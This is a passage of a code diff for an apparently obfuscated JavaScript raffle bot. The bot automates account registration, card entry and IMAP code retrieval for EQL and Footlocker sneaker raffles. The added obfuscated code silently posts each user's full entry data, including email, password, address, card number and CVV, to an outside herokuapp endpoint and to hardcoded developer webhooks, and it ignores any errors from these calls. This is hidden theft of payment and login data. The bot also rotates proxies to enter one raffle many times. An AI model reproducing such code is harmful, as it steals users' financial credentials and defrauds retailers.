+                                _0x33eb99[_0x3ae296]['Url']['includes']('en-GB') ? await _0x277da8['click']('li[data-value=\x22UK\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x20/\x20US\x20' + (Number(_0x33eb99[_0x3ae296]['Size']) + 0x1) + '\x22]') : await _0x277da8['click']('li[data-value=\x22EU\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x22]');
+                            } catch {
+                                throw new Error('Error\x20fetching\x20' + _0x33eb99[_0x3ae296]['Size']);
+                            }
+                            await _0x116d4a(0x6a4), await _0x277da8['type']('#email', '' + _0x33eb99[_0x3ae296]['Email']), await _0x116d4a(0x352), await _0x277da8['waitForSelector']('#password'), await _0x277da8['type']('#password', '' + _0x33eb99[_0x3ae296]['Password']), await _0x116d4a(0x352), await _0x277da8['type']('#phone', '' + _0x33eb99[_0x3ae296]['Phone']), await _0x116d4a(0x352);
+                            const _0x583950 = await _0x277da8['$']('#title\x20>\x20label');
+                            await _0x116d4a(0x12c);
+                            _0x583950 && await _0x583950['click']();
+                            await _0x277da8['type']('#firstName', '' + _0x33eb99[_0x3ae296]['FirstName']), await _0x116d4a(0x352), await _0x277da8['type']('#lastName', '' + _0x33eb99[_0x3ae296]['LastName']), await _0x116d4a(0x352);
+                            _0x33eb99[_0x3ae296]['Url']['includes']('footlocker.de') ? await _0x277da8['type']('#birthdate', _0x1053b1(0xa, 0x1c) + '.' + _0x1053b1(0xa, 0xc) + '.' + _0x1053b1(0x7c6, 0x7d3)) : await _0x277da8['type']('#birthdate', _0x1053b1(0xa, 0x1c) + '-' + _0x1053b1(0xa, 0xc) + '-' + _0x1053b1(0x7c6, 0x7d3));
+                            await _0x116d4a(0x352), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button');
+                            try {
+                                !_0x33eb99[_0x3ae296]['Url']['includes']('en-GB') && await _0x277da8['waitForSelector']('#stateAutocomplete');
+                            } catch {
+                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
+                            }
+                            await _0x116d4a(0x1f4), await _0x116d4a(0x5dc);
+                            if (!_0x521081['includes']('footlocker'))
+                                try {
+                                    await _0x277da8['click']('#country');
+                                    const _0x130828 = await _0x277da8['$']('li[data-value=\x22' + _0x33eb99[_0x3ae296]['Country'] + '\x22]');
+                                    await _0x130828['click'](), await _0x130828['click']();
+                                } catch {
+                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
+                                }
+                            await _0x116d4a(0x3e8);
+                            if (!_0x33eb99[_0x3ae296]['Url']['includes']('en-GB')) {
+                                await _0x277da8['click']('#stateAutocomplete'), await _0x116d4a(0x1f4);
+                                try {
+                                    const _0x588924 = await _0x277da8['$x']('//li[text()=\x22' + _0x33eb99[_0x3ae296]['State'] + '\x22]');
+                                    await _0x588924[0x0]['click']();
+                                } catch {
+                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
+                                }
+                            }
+                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x116d4a(0x3e8), await _0x116d4a(0x1f4), await _0x277da8['type']('#address1', _0x33eb99[_0x3ae296]['Address1'] + '\x20' + _0x33eb99[_0x3ae296]['HouseNumber']), await _0x116d4a(0x1f4), await _0x277da8['type']('#address2', '' + _0x33eb99[_0x3ae296]['Address2']), await _0x116d4a(0x1f4), await _0x277da8['type']('#city', '' + _0x33eb99[_0x3ae296]['City']), await _0x116d4a(0x1f4), await _0x277da8['type']('#postcode', '' + _0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x3e8), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x3e8), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Solving\x20Adyen');
+                            const _0x387966 = await _0x277da8['$']('span[data-cse=\x22encryptedCardNumber\x22]');
+                            _0x387966 && (await _0x277da8['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x4b0), await _0x277da8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x1f4), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0x116d4a(0x320), await _0x277da8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0x116d4a(0x4b0), await _0x277da8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x277da8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']), await _0x116d4a(0x226), await _0x277da8['type']('input[name=\x22postalCode\x22]', '' + _0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x226));
+                            const _0x3e5a23 = await _0x277da8['$']('.__PrivateStripeElement');
+                            _0x3e5a23 && (await _0x116d4a(0x1f4), await _0x277da8['click']('.__PrivateStripeElement'), await _0x277da8['click']('.__PrivateStripeElement'), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0x277da8['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']));
+                            await _0x116d4a(0x226), await _0x277da8['click']('#paymentConsent'), await _0x116d4a(0x226), await _0x277da8['click']('#termsConsent'), await _0x116d4a(0x2bc), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x2710);
+                            try {
+                                await _0x277da8['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x116d4a(0xbb8), await _0x277da8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xa78480 => _0xa78480['click']()), await _0x277da8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3f90b2 => _0x3f90b2['click']());
+                            } catch {
+                            }
+                            try {
+                                await _0x277da8['waitForSelector']('#code', { 'timeout': 0x7530 });
+                            } catch {
+                                const _0x238ee1 = await _0x277da8['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
+                                if (_0x238ee1) {
+                                    _0x65e0bc['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x33eb99[_0x3ae296]['Email'] + ',' + _0x33eb99[_0x3ae296]['Password'] + ',' + _0x33eb99[_0x3ae296]['Phone']);
+                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
+                                }
+                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
+                            }
+                            async function _0x3fb0ed() {
+                                var _0x4ecc63, _0x368628 = ![];
+                                for (var _0x1554b4 = 0x0; _0x1554b4 < 0x18; _0x1554b4++) {
+                                    async function _0x2ed6e7() {
+                                        var _0x25ca3a = new _0x3e4e8d({
+                                            'user': _0x51d52a['masterMail'],
+                                            'password': _0x51d52a['masterPassword'],
+                                            'host': 'imap.gmail.com',
+                                            'port': 0x3e1,
+                                            'tls': !![],
+                                            'autotls': 'always'
+                                        });
+                                        function _0x3ce15b(_0xe1f452) {
+                                            _0x25ca3a['openBox']('INBOX', ![], _0xe1f452);
+                                        }
+                                        _0x25ca3a['once']('ready', function () {
+                                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3ce15b(function (_0x4dba9a, _0x43dc33) {
+                                                console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
+                                                if (_0x4dba9a)
+                                                    throw _0x4dba9a;
+                                                _0x25ca3a['seq']['search']([
+                                                    'UNSEEN',
+                                                    [
+                                                        'FROM',
+                                                        'support@eql.com'
+                                                    ]
+                                                ], function (_0x472c5e, _0x4f827a) {
+                                                    if (!_0x4f827a || !_0x4f827a['length'])
+                                                        console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x25ca3a['end']();
+                                                    else {
+                                                        var _0x547581 = _0x25ca3a['seq']['fetch'](_0x4f827a, {
+                                                            'bodies': '',
+                                                            'markSeen': !![]
+                                                        });
+                                                        _0x547581['on']('message', function (_0x1a99de, _0x7630f1) {
+                                                            var _0x4e7719 = '(#' + _0x7630f1 + ')\x20';
+                                                            _0x1a99de['on']('body', function (_0x28105b, _0x4fbdba) {
+                                                                _0x300bc8(_0x28105b, (_0x14f570, _0x1369a4) => {
+                                                                    if (_0x1369a4['subject']['includes']('code')) {
+                                                                        const _0x41511c = _0x1369a4['text']['split']('\x0a\x0a')[0x3], _0x59b78e = _0x41511c['split']('\x0a')[0x1];
+                                                                        _0x4ecc63 = _0x59b78e;
+                                                                    }
+                                                                });
+                                                            }), _0x1a99de['once']('end', function () {
+                                                            });
+                                                        }), _0x547581['once']('error', function (_0x4aac69) {
+                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
+                                                        }), _0x547581['once']('end', function () {
+                                                            _0x25ca3a['end']();
+                                                        });
+                                                    }
+                                                });
+                                            });
+                                        }), _0x25ca3a['once']('error', function (_0x46858a) {
+                                            console['log'](_0x1403a4['red'](_0x46858a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x368628 = !![];
+                                        }), _0x25ca3a['once']('end', async function () {
+                                        }), _0x25ca3a['connect']();
+                                    }
+                                    _0x2ed6e7(), await _0x116d4a(0x1388);
+                                    if (_0x4ecc63)
+                                        return _0x4ecc63;
+                                    if (_0x368628)
+                                        throw new Error('Error\x20connecting\x20to\x20imap');
+                                    if (_0x1554b4 == 0x18)
+                                        throw new Error('Mail\x20not\x20found');
+                                }
+                            }
+                            ;
+                            code = await _0x3fb0ed(), await _0x116d4a(0x1f4), await _0x277da8['type']('#code', '' + code), await _0x116d4a(0x3e8), await _0x277da8['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x4bfa74 => _0x4bfa74['click']()), await _0x277da8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Verifying..');
+                            try {
+                                await _0x277da8['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
+                            } catch {
+                                throw new Error('');
+                            }
+                            console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x33eb99[_0x3ae296]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x65e0bc['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x33eb99[_0x3ae296]['Email'] + ',' + _0x33eb99[_0x3ae296]['Password'] + ',' + _0x33eb99[_0x3ae296]['Phone']), _0x18c823 = 'no', _0x523ce4(_0x33eb99[_0x3ae296], _0x463ad4);
+                            var _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
+                            let _0x315000 = _0x33eb99[_0x3ae296];
+                            try {
+                                prxdata = {
+                                    'username': _0x358285['replace']('#', ''),
+                                    'module': _0x463ad4['name'],
+                                    'entrydata': JSON['stringify'](_0x315000),
+                                    'proxy': '' + _0x7213f8[_0x3ae296]
+                                };
+                                var _0x2e4a43 = JSON['stringify'](prxdata);
+                                let _0x380c8a = { 'headers': { 'content-type': 'application/json' } };
+                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x2e4a43, _0x380c8a);
+                            } catch (_0x4262ce) {
+                            }
+                            const _0x57a9c7 = {
+                                'succesDEVMSG': { 'embeds': [_0x124193] },
+                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
+                            };
+                            try {
+                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x57a9c7['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x57a9c7['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x57a9c7['succesPUBMSG']);
+                            } catch (_0x2f0ec5) {
+                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2f0ec5));
+                            }
+                        } catch (_0xef109e) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20' + _0xef109e)), _0x9ba48a = '' + _0xef109e;
+                            var _0x2cb793 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', !![], _0x9ba48a), _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
+                            const _0x2b9515 = {
+                                'succesDEVMSG': { 'embeds': [_0x124193] },
+                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
+                            };
+                            _0x2b9515['errorDEV'] = { 'embeds': [_0x2cb793] };
+                            _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x2b9515['errorDEV']);
+                            await _0x3c7bbe(_0x802c1e, _0x2b9515['errorDEV']);
+                            if (!_0x18c823 == 'no')
+                                _0x18c823 = 'yes';
                         } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            if (retry == 'yes' && t != 5) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
+                            _0x3a464f && _0x3a464f['close']();
+                            if (_0x18c823 == 'yes' && _0x133942 != 0x5) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Retrying\x20(' + _0x133942 + '\x20/\x205)')), _0x3ae296 = _0x3ae296 - 0x1, _0x133942 = _0x133942 + 0x1;
                                 continue;
                             }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(kickz[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
+                            _0x18c823 == 'yes' && _0x133942 >= 0x5 && (_0x5925c7(_0x33eb99[_0x3ae296], _0x463ad4), _0x18c823 = 'no', _0x133942 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                        }
+                    } else {
+                        const _0x3a475e = '' + _0x33eb99[_0x3ae296]['Url'];
+                        if (_0x18c823 != 'yes')
+                            var _0x18c823 = '', _0x133942 = 0x0;
+                        if (_0x33eb99[_0x3ae296]['Email'] == '' || _0x33eb99[_0x3ae296]['FirstName'] == '' || _0x33eb99[_0x3ae296]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Invalid\x20CSV');
+                            continue;
+                        }
+                        _0x33eb99[_0x3ae296]['Password'] == '' && (_0x33eb99[_0x3ae296]['Password'] = 'JRaffles23!');
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x1b0a26 = _0x7213f8[_0x3ae296]['split'](':');
+                        else
+                            var _0x495766 = Math['round'](Math['random']() * (_0x7213f8['length'] - 0x1)), _0x1b0a26 = _0x7213f8[_0x495766]['split'](':');
+                        var _0x3a464f;
+                        try {
+                            _0x3a464f = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        } catch {
+                            _0x3a464f = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        }
+                        try {
+                            const _0xad01ac = await _0x3a464f['newPage']();
+                            await _0xad01ac['authenticate']({
+                                'username': '' + _0x1b0a26[0x2],
+                                'password': '' + _0x1b0a26[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xad01ac['setRequestInterception'](!![]), _0xad01ac['on']('request', _0x37b58a => {
+                                _0x37b58a['resourceType']() === 'image' || _0x37b58a['resourceType']() === 'font' || _0x37b58a['resourceType']() === 'media' ? _0x37b58a['abort']() : _0x37b58a['continue']();
+                            }), await _0xad01ac['goto'](_0x3a475e), await _0xad01ac['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xad01ac['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x116d4a(0x7d0), await _0xad01ac['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xad01ac['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x116d4a(0x3e8), await _0xad01ac['waitForSelector']('#email'), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xad01ac['type']('#email', '' + _0x33eb99[_0x3ae296]['Email']), await _0x116d4a(0x352), await _0xad01ac['waitForSelector']('#password'), await _0xad01ac['type']('#password', '' + _0x33eb99[_0x3ae296]['Password']), await _0x116d4a(0x352), await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x1388);
+                            if (!_0x33eb99[_0x3ae296]['Url']['includes']('footlocker'))
+                                await _0xad01ac['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
+                            try {
+                                await _0xad01ac['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
+                            } catch {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x523ce4(_0x33eb99[_0x3ae296], _0x463ad4), _0x18c823 = 'no';
+                                continue;
                             }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            await _0xad01ac['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x116d4a(0x3e8);
+                            try {
+                                _0x33eb99[_0x3ae296]['Url']['includes']('en-GB') ? await _0xad01ac['click']('li[data-value=\x22UK\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x20/\x20US\x20' + (Number(_0x33eb99[_0x3ae296]['Size']) + 0x1) + '\x22]') : await _0xad01ac['click']('li[data-value=\x22EU\x20' + _0x33eb99[_0x3ae296]['Size'] + '\x22]');
+                            } catch {
+                                throw new Error('Error\x20fetching\x20size\x20' + _0x33eb99[_0x3ae296]['Size']);
+                            }
+                            await _0x116d4a(0x1f4);
+                            const _0x599dff = await _0xad01ac['$']('#title\x20>\x20label');
+                            await _0x116d4a(0x12c);
+                            _0x599dff && await _0x599dff['click']();
+                            await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xad01ac['focus']('#postcode'), await _0xad01ac['keyboard']['down']('Control'), await _0xad01ac['keyboard']['press']('A'), await _0xad01ac['keyboard']['up']('Control'), await _0xad01ac['keyboard']['press']('Backspace'), await _0xad01ac['keyboard']['type'](_0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x60e), await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x3e8), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x116d4a(0x1f4);
+                            const _0x3b2fcb = await _0xad01ac['$']('span[data-cse=\x22encryptedCardNumber\x22]');
+                            _0x3b2fcb && (await _0xad01ac['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xad01ac['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xad01ac['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x4b0), await _0xad01ac['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x116d4a(0x1f4), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0x116d4a(0x320), await _0xad01ac['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0x116d4a(0x4b0), await _0xad01ac['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']), await _0x116d4a(0x226), await _0xad01ac['type']('input[name=\x22postalCode\x22]', '' + _0x33eb99[_0x3ae296]['Zip']), await _0x116d4a(0x226));
+                            const _0x1d02b5 = await _0xad01ac['$']('.__PrivateStripeElement');
+                            _0x1d02b5 && (await _0xad01ac['click']('#billingName'), await _0xad01ac['click']('#billingName'), await _0xad01ac['type']('#billingName', '' + _0x33eb99[_0x3ae296]['NameOnCard']), await _0x116d4a(0x1f4), await _0xad01ac['click']('.__PrivateStripeElement'), await _0xad01ac['click']('.__PrivateStripeElement'), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CardNumber']), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['ExpiryDate']), await _0xad01ac['keyboard']['type']('' + _0x33eb99[_0x3ae296]['CVV']));
+                            await _0x116d4a(0x226), await _0xad01ac['click']('#paymentConsent'), await _0x116d4a(0x226), await _0xad01ac['click']('#termsConsent'), await _0x116d4a(0x2bc), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xad01ac['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x116d4a(0x2710);
+                            try {
+                                await _0xad01ac['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x116d4a(0xbb8), await _0xad01ac['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x37dc67 => _0x37dc67['click']()), await _0xad01ac['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x28667c => _0x28667c['click']());
+                            } catch {
+                            }
+                            try {
+                                await _0xad01ac['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
+                            } catch {
+                                throw new Error('Failure\x20getting\x20succes\x20response');
+                            }
+                            console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x523ce4(_0x33eb99[_0x3ae296], _0x463ad4);
+                            var _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
+                            let _0x5b9f90 = _0x33eb99[_0x3ae296];
+                            try {
+                                prxdata = {
+                                    'username': _0x358285['replace']('#', ''),
+                                    'module': _0x463ad4['name'],
+                                    'entrydata': JSON['stringify'](_0x5b9f90),
+                                    'proxy': '' + _0x7213f8[_0x3ae296]
+                                };
+                                var _0x2e4a43 = JSON['stringify'](prxdata);
+                                let _0x4c3fdb = { 'headers': { 'content-type': 'application/json' } };
+                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x2e4a43, _0x4c3fdb);
+                            } catch (_0xe66fd1) {
+                            }
+                            const _0x59fb88 = {
+                                'succesDEVMSG': { 'embeds': [_0x124193] },
+                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
+                            };
+                            try {
+                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x59fb88['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x59fb88['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x59fb88['succesPUBMSG']);
+                            } catch (_0x19a3d1) {
+                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x19a3d1));
+                            }
+                            _0x18c823 = 'no';
+                        } catch (_0xd14b98) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20' + _0xd14b98)), _0x9ba48a = '' + _0xd14b98;
+                            var _0x2cb793 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', !![], _0x9ba48a), _0x124193 = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'dev', ![]), _0x5efc4f = await _0x2520f4(_0x33eb99[_0x3ae296], _0x463ad4, 'pub', ![]);
+                            const _0x9c0cba = {
+                                'succesDEVMSG': { 'embeds': [_0x124193] },
+                                'succesPUBMSG': { 'embeds': [_0x5efc4f] }
+                            };
+                            _0x9c0cba['errorDEV'] = { 'embeds': [_0x2cb793] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x9c0cba['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x9c0cba['errorDEV']), _0x18c823 = 'yes';
+                        } finally {
+                            _0x3a464f && _0x3a464f['close']();
+                            if (_0x18c823 == 'yes' && _0x133942 != 0x5) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Retrying\x20(' + _0x133942 + '\x20/\x205)')), _0x3ae296 = _0x3ae296 - 0x1, _0x133942 = _0x133942 + 0x1;
+                                continue;
+                            }
